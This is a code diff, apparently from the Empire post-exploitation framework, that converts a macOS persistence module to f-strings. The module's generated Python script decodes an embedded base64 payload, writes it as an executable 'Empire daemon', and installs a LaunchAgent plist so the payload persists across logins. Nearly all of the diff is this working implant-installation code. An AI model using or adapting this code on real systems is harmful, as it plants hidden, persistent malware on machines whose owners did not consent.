@@ -16,7 +16,7 @@ class Module:
     ) -> tuple[str | None, str | None]:
         daemon_name = params["DaemonName"]
         program_name = daemon_name.split(".")[-1]
-        plist_filename = "%s.plist" % daemon_name
+        plist_filename = f"{daemon_name}.plist"
         listener_name = params["Listener"]
         user_agent = params["UserAgent"]
         safe_checks = params["SafeChecks"]
@@ -50,7 +50,7 @@ class Module:
 </dict>
 </plist>"""
 
-        script = """
+        script = f"""
 import subprocess
 import sys
 import base64
@@ -61,43 +61,37 @@ user = os.environ['USER']
 group = 'wheel' if isRoot else 'staff'
 
 launchPath = '/Library/LaunchAgents/' if isRoot else '/Users/'+user+'/Library/LaunchAgents/'
-daemonPath = '/Library/Application Support/{daemonName}/' if isRoot else '/Users/'+user+'/Library/Application Support/{daemonName}/'
+daemonPath = '/Library/Application Support/{daemon_name}/' if isRoot else '/Users/'+user+'/Library/Application Support/{daemon_name}/'
 
-encBytes = "{encBytes}"
+encBytes = "{enc_bytes}"
 bytes = base64.b64decode(encBytes)
 plist = \"\"\"{plistSettings}
-\"\"\" % ('{daemonName}', daemonPath+'{programName}')
+\"\"\" % ('{daemon_name}', daemonPath+'{program_name}')
 
 if not os.path.exists(daemonPath):
     os.makedirs(daemonPath)
 
-e = open(daemonPath+'{programName}','wb')
+e = open(daemonPath+'{program_name}','wb')
 e.write(bytes)
 e.close()
 
-os.chmod(daemonPath+'{programName}', 0755)
+os.chmod(daemonPath+'{program_name}', 0755)
 
-f = open('/tmp/{plistFilename}','w')
+f = open('/tmp/{plist_filename}','w')
 f.write(plist)
 f.close()
 
-os.chmod('/tmp/{plistFilename}', 0644)
+os.chmod('/tmp/{plist_filename}', 0644)
 
-process = subprocess.Popen('chown '+user+':'+group+' /tmp/{plistFilename}', stdout=subprocess.PIPE, shell=True)
+process = subprocess.Popen('chown '+user+':'+group+' /tmp/{plist_filename}', stdout=subprocess.PIPE, shell=True)
 process.communicate()
 
-process = subprocess.Popen('mv /tmp/{plistFilename} '+launchPath+'{plistFilename}', stdout=subprocess.PIPE, shell=True)
+process = subprocess.Popen('mv /tmp/{plist_filename} '+launchPath+'{plist_filename}', stdout=subprocess.PIPE, shell=True)
 process.communicate()
 
-print("\\n[+] Persistence has been installed: "+launchPath+"{plistFilename}")
-print("\\n[+] Empire daemon has been written to "+daemonPath+"{programName}")
+print("\\n[+] Persistence has been installed: "+launchPath+"{plist_filename}")
+print("\\n[+] Empire daemon has been written to "+daemonPath+"{program_name}")
 
-""".format(
-            encBytes=enc_bytes,
-            plistSettings=plistSettings,
-            daemonName=daemon_name,
-            programName=program_name,
-            plistFilename=plist_filename,
-        )
+"""
 
         return script
